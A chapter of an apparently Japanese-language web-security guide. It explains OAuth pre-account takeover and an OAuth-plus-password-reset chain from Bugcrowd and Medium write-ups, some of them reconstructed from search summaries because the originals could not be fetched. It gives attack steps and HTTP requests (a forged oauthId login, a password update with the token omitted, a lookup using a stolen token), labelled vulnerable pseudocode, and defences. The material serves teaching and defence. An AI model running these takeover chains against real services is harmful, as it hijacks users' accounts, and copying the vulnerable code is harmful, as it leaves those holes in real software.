> 位置づけ: KhaledAhmed107「How I Found 5 OAuth Misconfigurations Leading to Pre-Account Takeover in Public Bug Bounty Programs on Bugcrowd」(2025年8月24日)。Bugcrowd の公開プログラム複数で、同じ根本原因を持つ事前アカウント乗っ取りを 5 件見つけた記録。報告は先行報告との重複（duplicate）扱いだったが、OAuth フローの理解を深めた過程が主眼。

> ⚠️ **未取得の資料**: 「How I Found 5 OAuth Misconfigurations Leading to Pre-Account Takeover」は自動取得できませんでした（理由: Medium が HTTP 403 でブロックし、ミラーも取得不可。検索結果の要約のみ入手）。以下の URL からご自身で直接ご覧ください: https://medium.com/@KhaledAhmed107/how-i-found-5-oauth-misconfigurations-leading-to-pre-account-takeover-in-public-bug-bounty-programs-021d4c8c6954

（以下は未取得資料の補足として一般知識に基づく解説です。）検索で判明した確実な要点は次のとおり。この 5 件は「攻撃者が、**まだ本人が登録していない／メール検証を終えていない**被害者の枠を先取りできる」事前アカウント乗っ取りである。ライトアップの記述では「本人がサインアップやメール検証をする前にアカウントを乗っ取れる」ことが本質で、影響は個人データの不正取得・なりすまし・詐欺・被害者が気づかない完全アカウント侵害に及ぶ。

#### 事前アカウント乗っ取りの一般的な成立原理

事前アカウント乗っ取りは、以下のような**アカウント統合ロジックの穴**から生じる。防御側として押さえるべき典型パターンを 5 つに整理する（記事の「5 件」の具体名は未取得だが、この分野で繰り返し観測される代表的パターン）。

1. **パスワード登録と OAuth 登録の合流に検証がない**
   攻撃者が `victim@example.com` でパスワード登録（メール未検証のまま放置）→ 後日、被害者が Google でログイン → サービスが**同一メールを理由に既存の未検証アカウントへ合流**させる。攻撃者は先に仕込んだパスワードでその統合済みアカウントに入れてしまう。
   *原理*: 「メール検証が完了していないローカルアカウント」を残したまま SSO と紐付けることが穴。合流前に必ずメール所有証明を要求すべき。

2. **OAuth プロバイダのメール検証状態（`email_verified`）を無視**
   ID トークンの `email_verified: false` を確認せず、メール文字列だけで既存アカウントに紐付ける。攻撃者がプロバイダ側で任意メールを（未検証で）設定できれば、被害者アカウントに合流できる。

3. **`state` パラメータ不使用・未検証による OAuth CSRF（ログイン CSRF / アカウント連携の乗っ取り）**
   `state` を検証しないと、攻撃者が自分の認可コードを被害者のブラウザで消費させ、**被害者のセッションに攻撃者の OAuth アカウントを紐付ける**（あるいは逆に、被害者の連携を攻撃者アカウントへ結ぶ）ことができる。

4. **アカウント連携（linking）時の本人確認欠如**
   既存ログイン中のユーザに OAuth を「追加連携」する導線で、追加されるプロバイダアカウントの所有者確認をしない。攻撃者が用意した SSO を被害者アカウントへ結び、以後その SSO でログインできる。

5. **メール取得不可時の「手入力メール」を無検証で信頼**
   プロバイダからメールが取れなかった場合にアプリが**メールを手入力させ、検証なしでそのアドレスのアカウントを作る/紐付ける**。攻撃者は被害者のメールを入力するだけで、その枠を確保できる（記事3の Facebook ケースと同根の問題）。

#### 影響と分類

これらは CVSS 上は多くが High〜Critical、Bugcrowd の VRT では「Broken Authentication and Session Management > OAuth」系に分類され、事前 ATO は本人が気づかないまま成立する点で特に厄介である。記事では複数が重複（duplicate, P2 相当）判定だったと述べられており、**同種の穴が業界横断で頻出している**ことを示している。

#### 防御

- OAuth 連携・自動作成の前に、**メールの所有証明（検証済みであること）を必ず確認**する。プロバイダの `email_verified` を検証し、`false` なら合流させない。
- ローカル登録と SSO の合流は、**既存アカウント側で本人確認（ログイン or メール検証リンク）**を経てから行う。
- `state`（および可能なら nonce）を**生成・保存・照合**し、OAuth CSRF を封じる。
- 「メールが取れないときの手入力」を廃するか、入力後に**検証メールで所有を確認**してからでないと紐付けない。

> 出典: How I Found 5 OAuth Misconfigurations Leading to Pre-Account Takeover in Public Bug Bounty Programs on Bugcrowd (KhaledAhmed107) — https://medium.com/@KhaledAhmed107/how-i-found-5-oauth-misconfigurations-leading-to-pre-account-takeover-in-public-bug-bounty-programs-021d4c8c6954

---

### 記事3: Facebook OAuth のメール信頼問題による完全アカウント乗っ取り

> 位置づけ: Ahmed Tarek「Full Account Takeover via Facebook OAuth Misconfiguration」。Facebook でのログイン時に、アプリ側がプロバイダから返る（あるいは返らない）メール情報の扱いを誤ったことで完全 ATO に至った事例。報告は 4 日前の先行報告と同一根本原因の重複扱いだった。

> ⚠️ **未取得の資料**: 「Full Account Takeover via Facebook OAuth Misconfiguration」は自動取得できませんでした（理由: Medium が HTTP 403 でブロックし、同系統のミラー記事も 403）。以下の URL からご自身で直接ご覧ください: https://medium.com/@0x_xnum/full-account-takeover-via-facebook-oauth-misconfiguration-9e30fe1c1da1

（以下は未取得資料の補足として一般知識に基づく解説です。）検索で確認できた確実な要点は、この記事の教訓が「**OAuth ログイン後は必ずユーザデータを検証せよ。プロバイダが共有しない項目であってもメールなど重要情報を適切に確認せよ**」であり、「**システムが欠落データや改変データをどう扱うかをテストせよ**」という点にあることだ。これは Facebook OAuth に特有の、しかし極めて頻出する落とし穴を突いている。

#### Facebook OAuth の「メールは保証されない」という前提

Facebook Login は、Google の OpenID Connect と異なり、**メールアドレスの返却を保証しない**。ユーザがメールを未登録・非公開にしている、あるいは電話番号のみで登録している場合、`email` フィールドは**空**で返る。さらに Facebook のメールは必ずしも検証済みとは限らない。アプリがこの前提を誤ると、次のような穴が生まれる。

- **穴A（メール欠落時の手入力を無検証で信頼）**: Facebook から `email` が返らなかったとき、アプリが「ではメールを入力してください」と促し、**入力値を検証せずにアカウント作成/紐付け**する。攻撃者は自分の Facebook でログイン → メール欄に `victim@example.com` を入力 → サービスは被害者のメールを持つアカウントを攻撃者の Facebook に紐付ける。以後、攻撃者は自分の Facebook で被害者アカウントにログインできる。

- **穴B（メール一致だけで既存アカウントへ合流）**: `email_verified` を確認せず、返ってきたメール文字列が既存ユーザと一致するだけで合流させる。攻撃者が Facebook 側で被害者のメールを（未検証で）プロフィールに設定できれば、被害者アカウントに入り込める。

疑似コードで危険な実装を示す（**アンチパターン**。防御のための対比例）。

```python
# 危険な実装（やってはいけない例）
profile = facebook.get_profile(access_token)
email = profile.get("email")
if not email:
    email = request.form["email"]   # ← 手入力を無検証で受け入れる
user = User.find_by_email(email)     # ← email_verified を見ていない
if user is None:
    user = User.create(email=email)
login(user)                          # ← 所有証明なしにログイン成立
```

*なぜ危険か*: この実装は「メール文字列 = 本人性の証明」と暗黙に仮定している。しかし Facebook はメールの真正性を保証せず、まして手入力値は完全に攻撃者の自由になる。**認証（誰であるか）とアカウント特定キー（どのレコードか）を、検証されていない属性で結んでしまう**ことが根本原因である。

#### 安全な実装

```python
# 安全な実装
profile = facebook.get_profile(access_token)
# 1) プロバイダ固有の安定 ID を主キーにする
fb_id = profile["id"]
user = User.find_by_facebook_id(fb_id)
if user:
    login(user); return

email = profile.get("email")
verified = profile.get("email_verified", False)  # 取れないなら未検証扱い
if email and verified:
    existing = User.find_by_email(email)
    if existing:
        # 既存アカウントへの合流は本人確認を挟む
        require_verification_before_link(existing, fb_id); return
# メールが無い/未検証なら、検証メールで所有を証明させてから作成・紐付け
start_email_verification_flow(fb_id)
```

*ポイント*: (1) 紐付けの主キーは**プロバイダの安定した一意 ID**（Facebook の `id`）にし、可変・偽装可能なメールに依存しない。(2) メールで既存合流するのは**検証済みのときだけ**。(3) メールが取れない/未検証なら、**自前の検証フロー**で所有を確認してから初めてアカウントに結ぶ。

#### 影響と教訓

影響は完全アカウント乗っ取り（被害者のデータ閲覧・操作）に至る。記事が重複扱いだった事実は、この「OAuth プロバイダのメールを盲信する」パターンが**多数のサービスに共通して残存**していることを示す。教訓は明快で、**OAuth はあくまで「そのプロバイダのそのアカウントを操作できる人物」であることしか証明しない**。サービス側のアカウント特定・合流は、常にサービス側で検証した属性に基づいて行うべきである。

> 出典: Full Account Takeover via Facebook OAuth Misconfiguration (Ahmed Tarek) — https://medium.com/@0x_xnum/full-account-takeover-via-facebook-oauth-misconfiguration-9e30fe1c1da1

---

### 3 事例に共通する原則（まとめ）

3 本のライトアップは対象も切り口も違うが、根っこの教訓は一つに収束する。

1. **単体では「仕様通り」の挙動が、連鎖で致命傷になる**（記事1）。動的登録・`redirect_uri` 検証・PKCE の `none`・CORS はそれぞれ個別の設定だが、信頼境界を跨いで重なると認可コード横取りから ATO に直結する。防御は「各設定を単独で正しくする」だけでなく「連鎖を断つ点」を一つでも確実に固めること（特に **`redirect_uri` の厳密一致**と**クライアント登録の認証**）。

2. **アカウントの特定・合流は、検証済みの属性だけに基づけ**（記事2・記事3）。プロバイダのメール、まして手入力のメールを本人性の証明に使ってはならない。`email_verified` を確認し、安定した一意 ID を主キーにし、合流時は本人確認を挟む。

3. **「欠落・改変データをどう扱うか」を必ずテストする**（記事3の明示的教訓）。メールが返らない、`state` が無い、`code_verifier` が無い——こうした「本来あるべき値が欠けたリクエスト」を、システムが安全側（拒否・追加検証）に倒すかどうかが分水嶺になる。

防御チェックリストとして最低限:

- `redirect_uri` は事前登録済み URI と**完全一致**でのみ許可する。
- クライアント登録（特に動的登録）は**認証必須**。
- 公開クライアントは **PKCE（S256）を必須検証**、`code_verifier` 不一致は拒否。
- 認可/トークン系エンドポイントに**ワイルドカード CORS を置かない**。
- OAuth の**メールは検証済みのときのみ**アカウント特定に使う。手入力メールは自前で検証。
- **`state`（＋ nonce）を必ず照合**して OAuth CSRF を防ぐ。
- アカウント合流は**既存アカウント側の本人確認**を経てから。

なお本セクションは防御目的の解説であり、実在サービスや本番環境への無許可の検証、破壊的手順は扱わない。自組織の実装レビューや、許可された検証環境での確認に活用してほしい。

## 事前アカウント乗っ取りとパスワードリセットとの連鎖

OAuthの脆弱性は、単体では「情報漏えい」程度の被害に見えることがある。しかし実際のバグバウンティ報奨金が高額になるのは、OAuthの欠陥を**パスワードリセット機能や新規登録フローと連鎖させ**、最終的に完全なアカウント乗っ取り（Account Takeover, ATO）に到達させるケースである。本節では、OAuthとパスワードリセットの連鎖によるATOを実演したBugcrowdの公開ライトアップと、OAuth設定不備単体で「事前アカウント乗っ取り（Pre-Account Takeover）」が成立する典型パターンを扱う。いずれも「認証の代替手段（OAuth／パスワードリセット）が、本来必須であるはずの検証を暗黙に免除してしまう」という同じ根本原因を持つ。

### 1. OAuthのoauthId依存とパスワードリセットのトークン欠落を連鎖させたATO

このケースは、単体では中程度の深刻度に見える2つの欠陥――「OAuth認証がoauthIdという単一の識別子だけに依存していた」欠陥と、「パスワードリセットAPIがトークンパラメータの欠落を許していた」欠陥――を組み合わせることで、被害者に一切気づかせずに永続的な乗っ取りを実現した点が核心である。

#### 欠陥A: oauthIdだけで完了してしまうOAuthログイン

対象サービスのFacebook経由ログインは、次のようなJSONをサーバーに送るだけで完了していた。

```http
POST /auth/login
Content-Type: application/json

{
  "loginType": "facebook",
  "oauthId": "100012345678901"
}
```

正規のOAuthフローでは、サーバーはクライアントから受け取った**アクセストークン**をFacebook側のAPI（例: Graph API）に再検証（token introspection）させ、そのトークンが誰のものかをFacebook自身に確認させる。ところがこの実装では、クライアント側から渡された`oauthId`（Facebookのユーザーを一意に表す16桁程度の数値ID）を**そのまま信用**し、それ以外のパラメータは値の妥当性検証をしていなかった。

なぜこれが致命的か。`oauthId`はアクセストークンと違って**秘匿情報ではない**。Facebookのプロフィールページや、Graph APIの公開エンドポイントから容易に取得・推測できる。つまりサーバーは「本人であることの証明」であるはずのトークンを一切確認せず、「本人を指し示すラベル」でしかないIDを、そのラベルの持ち主本人からの入力であるかのように扱ってしまっていた。これは認証（authentication：あなたは誰か）と識別（identification：あなたは何と呼ばれているか）を混同した典型的な実装ミスである。

#### 攻撃手順（XSS経由でのoauthId窃取）

記事が示すシナリオでは、攻撃者はまずアプリ内のXSS（クロスサイトスクリプティング、詳細は別章参照）を利用し、被害者のブラウザのlocalStorageに保存されたFacebookのアクセストークンを窃取する。

1. 被害者に悪意あるリンク（XSSペイロードを含む）を送る。
2. 被害者がリンクを開くと、注入されたスクリプトがlocalStorage内のFacebookトークンを攻撃者のサーバーへ送信する。
3. 攻撃者は盗んだトークンを使い、Facebook Graph APIへ問い合わせて`oauthId`（ユーザーID）を取得する。

```
GET https://graph.facebook.com/me?fields=id&access_token=<窃取したトークン>
```

4. 取得した`oauthId`を対象サービスのログインAPIにそのまま送信し、被害者になりすましたセッションクッキーを得る。

ここで重要なのは、**攻撃者はFacebookのトークン自体を最後まで持ち続ける必要がない**という点である。トークンは「`oauthId`を割り出すための踏み台」として一度だけ使われ、以後はoauthId単体で何度でもログインできてしまう。サーバー側の検証が薄いほど、攻撃者が持つべき情報の鮮度・機密性の要求水準が下がり、攻撃の再現性・持続性が高まるという構造がここに見える。

#### 欠陥B: パスワードリセットAPIのトークン検証欠落

同じサービスのパスワード更新エンドポイントは次のような構造を持っていた。

```http
POST /auth/update-password
Content-Type: application/json

{
  "User": "<UUIDv4>",
  "Password": "<新しいパスワード>",
  "Token": "<リセットトークン>"
}
```

本来、`Token`はメールで送られたワンタイムのリセットトークンであり、「このリクエストの送信者が、対象メールアドレスの受信箱にアクセスできる本人である」ことを保証するための唯一の根拠である。しかし検証を担当したペンテスターが`Token`パラメータをリクエストから**完全に取り除いて**送信したところ、サーバーはエラーを返さず、ステータスコード`409`とユーザーデータをそのまま返却し、パスワード変更が成立してしまった。

なぜ「パラメータを消す」だけで検証をすり抜けられるのか。サーバー側の典型的な実装ミスは次のようなものである。

```
if (request.Token) {
    verify(request.Token, user);
}
// Tokenが存在しない場合、検証ブロックがまるごとスキップされる
updatePassword(request.User, request.Password);
```

つまり「トークンが送られてきたら検証する」というif分岐になっており、「トークンが必ず送られてこなければならない」という**必須パラメータの存在チェック（required-field validation）**が抜けている。これは値の中身（トークンが正しいか）を検証するロジックと、値そのものが存在するかを検証するロジックを混同したまま実装してしまうと発生する典型的なバグであり、パラメータ改ざん（parameter tampering）系の脆弱性診断で必ず確認すべき観点の一つである。

#### 完全なチェーン攻撃シナリオ

単体の欠陥Bだけでは「対象ユーザーのUUIDv4を知っている攻撃者が任意にパスワードを変更できる」に留まる。UUIDv4はランダム性が高く、通常は推測できない。記事のライトアップが示す真の脅威は、**被害者自身のUUIDv4を攻撃者に「合法的に」入手させる別の機能不備**と組み合わせたことにある。

1. 対象サービスには、被害者のメールアドレスを指定して自分のワークスペース（組織／チーム）に招待できる機能があり、招待は被害者側の承認なしに成立してしまう。攻撃者はこの機能を使い、被害者のメールアドレスを自分のワークスペースへ招待する。
2. サービスにはブルートフォース対策として、6回のログイン失敗でアカウントをロックする機能がある。攻撃者はこれを逆用し、被害者のアカウントに対して適当なパスワードで6回連続ログイン試行し、意図的にアカウントをロックさせる。
3. ロック通知を受けた被害者は、正規のパスワードリセット手続きを自ら開始する。
4. ここでサービス側の内部処理に欠陥がある。パスワードリセット（あるいはロック解除に付随する処理）の過程で、手順1で作られた「攻撃者のワークスペードに招待された際に生成されたUUIDv4」が、被害者本人のアカウントに紐づけられてしまう。複数の識別子（招待用の仮UUIDと、本来の本人確認済みUUID）を統合する処理に、所有者の一致を確認しないバグが存在したためである。
5. 攻撃者は、手順1で自分が把握しているそのUUIDv4を使い、`Token`パラメータを省いた次のリクエストを送信するだけで、被害者のパスワードを何度でも変更できる。

```
POST /auth/update-password
{
  "User": "<手順1で招待時に生成されたUUIDv4>",
  "Password": "<攻撃者が指定する新しいパスワード>"
}
```

被害者が異変に気づいて自分でもう一度パスワードをリセットしても、攻撃者は同じUUIDv4を握っている限り、手順1〜4を繰り返す必要すらなく、何度でもパスワードを書き換えて再ログインできる。これが「一度きりの侵入」ではなく「持続的な支配」に発展する所以である。

#### 根本原因のまとめと防御

- OAuthログインが、トークンをIdPに再検証させず、クライアントが自称する識別子（oauthId）を信用してしまった。→ **対策**: サーバー側でアクセストークンを都度IdPのtoken introspectionエンドポイント（例: Facebook Graph APIの`/debug_token`、あるいはGoogleの`tokeninfo`）に投げ、トークンの有効性と紐づくユーザーIDをサーバー間通信で確認する。クライアントから送られた識別子は絶対に信用しない。
- パスワードリセットAPIが、トークンパラメータの**非存在**を「検証不要」と誤って解釈した。→ **対策**: 必須パラメータの欠落は他の検証より先に、明示的に拒否する（デフォルト拒否・フェイルセキュア設計）。トークンは有効期限・1回限りの使い切り（one-time use）・対象ユーザーとの厳密な紐付けをサーバー側の状態で管理し、クライアントの入力だけで真偽を判定しない。
- 複数の識別子（招待用の仮ID、認証済みユーザーの本ID）を統合する処理で、所有者の一致確認を欠いた。→ **対策**: アカウントの紐付け・統合操作は、いずれの識別子も同一の検証済み本人によって取得されたことを個別に確認したうえで実行する。

> 出典: Breaking the Chain: Exploiting OAuth and forgot password for account takeover — https://www.bugcrowd.com/blog/breaking-the-chain-exploiting-oauth-and-forgot-password-for-account-takeover/

### 2. OAuth設定不備による「事前」アカウント乗っ取り（Pre-Account Takeover）

> ⚠️ **未取得の資料**: 「Pre-Account Takeover via OAuth Misconfiguration」（InfoSec Write-ups、Ehtesham Ul Haq氏）は自動取得できませんでした（理由: 記事配信元がWebFetchのアクセスをHTTP 403で拒否したため。代替としてWebSearchによる要約取得を2回試みたが、原文の完全なリクエスト例やコード断片までは再現できなかった）。以下のURLからご自身で直接ご覧ください: https://infosecwriteups.com/pre-account-takeover-via-oauth-misconfiguration-0e393cda1f7e

（以下は未取得資料の補足として一般知識に基づく解説です。WebSearchで得られた要約によれば、この記事は「攻撃者が被害者のメールアドレスをメール/パスワード方式で先に登録し、後から被害者本人が同じメールアドレスでGoogle OAuthを使ってログインすると、両者が同一アカウントを共有してしまう」という、Pre-Account Takeoverの典型パターンを報告したものである。この報告と同種の脆弱性は、HackTricksの「OAuth to Account Takeover」やBugcrowd上の複数の類似報告でも繰り返し確認されている、業界でよく知られたパターンである。）

#### 仕組み

「Pre-Account Takeover」とは、被害者が**まだそのサービスにアカウントを作っていない、あるいは作った直後でメール確認が完了していない**時点で、攻撃者が先手を打ってアカウントを乗っ取る攻撃を指す。典型的な手順は次の通りである。

1. 攻撃者は被害者のメールアドレス（例: `victim@example.com`）を使い、通常のメール／パスワード方式で対象サービスに新規登録する。多くのサービスは、この時点でメールアドレスの所有権確認（確認メール内のリンククリックなど）を要求するが、この確認が完了する**前**でもアカウント自体は作成され、ログイン可能な状態になっている実装が少なくない。
2. その後、正規の被害者本人が同じサービスに対し、「Googleでログイン」ボタンを使って`victim@example.com`のGoogleアカウントでサインインを試みる。
3. サーバー側の典型的な実装では、OAuthでログインが成功しIdP（Googleなど）から`email`クレームを受け取ると、まず「そのメールアドレスに対応する既存アカウントがあるか」をDBで検索する。手順1で攻撃者が作ったアカウントが見つかるため、サーバーはそれを被害者本人のアカウントと**同一視**し、そのままログインさせてしまう。
4. 結果として、攻撃者が最初に設定したパスワードでも、被害者がOAuthでログインしたのと同じアカウントにアクセスできる状態が生まれる。両者は同じアカウントを共有し、攻撃者は被害者が保存する個人情報・決済情報・連携サービスなどに継続的にアクセスできる。

#### なぜこれが起きるのか（原理）

この欠陥の核心は、OAuthのIDトークンやユーザー情報エンドポイントが返す`email`クレームを、サーバーが「そのメールアドレスの所有権が確認済みである」と暗黙に信用してしまう点にある。OpenID Connectの仕様では、IDトークンに`email_verified`というブール値のクレームが含まれ、IdP（Google等）がそのメールアドレスの所有権を確認済みかどうかを明示する。ここでの問題は次の2層構造で起きる。

- **IdP側の`email_verified`**: GoogleなどのIdPは自分の管轄下でメール確認済みかを示すが、これは「Googleのユーザーがそのメールを確認した」という意味であり、対象サービス側で先に作られたアカウントの所有者が誰であるかとは無関係である。
- **サービス側のアカウント統合ロジック**: サービスが「メールアドレスが一致したら同一アカウントとみなす」という単純なロジックを採用し、その一致判定の前に**既存アカウント（手順1で攻撃者が作ったもの）自体がメール確認済みかどうか**を確認していない場合、攻撃者が先に登録しただけの未確認アカウントに、後から来た正規のOAuthログインが**統合（アカウントリンク）**されてしまう。

つまり脆弱性の本質は「OAuthの信頼できるメール確認結果」と「サービス独自のパスワード登録（メール確認が伴わないか、確認前でもログイン可能な状態）」という**信頼度の異なる2つの経路が、同じメールアドレスというキーで無条件に統合される**ことにある。OAuthそのものの実装は正しくても、既存アカウントとのリンク処理に検証漏れがあれば同じ結果に至る。

#### 影響と防御

影響は、パスワードだけで作られた「空のなりすましアカウント」が、正規ユーザーの本物のアカウントへ後から合体してしまうことで、攻撃者が継続的にアクセス権を握り続けることである。当人（被害者）は「Googleでログインしたら普通に使えた」としか見えないため、乗っ取りに気づく手段がほとんどない。

- サービス独自のメール／パスワード登録では、メールアドレスの所有権確認（確認リンクのクリック）が完了するまでアカウントを「未確定」状態に留め、ログインを許可しない。
- OAuthログイン時にメールアドレスが既存アカウントと一致した場合、その既存アカウントが「メール確認済み」であることを条件に統合し、未確認の既存アカウントとは統合せず、むしろ新規作成またはエラーとして扱う。
- OAuthの`email_verified`クレームが`false`または欠落している場合は、メールアドレスによる既存アカウントとの自動統合を行わない。
- アカウント統合を行う場合は、統合前に本人確認（例: 既存アカウントのパスワード入力、または追加のメール確認）を挟む「アカウントリンクの明示的な同意ステップ」を設ける。

> 出典: Pre-Account Takeover via OAuth Misconfiguration — https://infosecwriteups.com/pre-account-takeover-via-oauth-misconfiguration-0e393cda1f7e

### まとめ

本節で見た2つの事例は、いずれも「OAuthという“第二の認証経路”が、既存のパスワード認証やパスワードリセットという“第一の認証経路”の検証基準をすり抜けさせてしまう」という共通の構造を持つ。単一の認証手段だけを厳格に検査しても、複数の認証手段・アカウント紐付け処理の**境界**を見落とせば、そこが最も破られやすい継ぎ目になる。診断者は、OAuthの実装単体の脆弱性を探すだけでなく、「OAuthログインの結果が、パスワードリセット・アカウント統合・招待・ロック解除といった他の機能とどこで交差するか」を必ずマッピングし、その交差点でのなりすまし・検証省略の可能性を検証する必要がある。


---

## ナビゲーション

[← 第2章 脆弱性クラス](02-vulnerability-classes.md)  ｜  [📚 目次（ホーム）](index.md)  ｜  [第4章 安全な環境での検証演習と方法論](04-hands-on-methodology.md) →
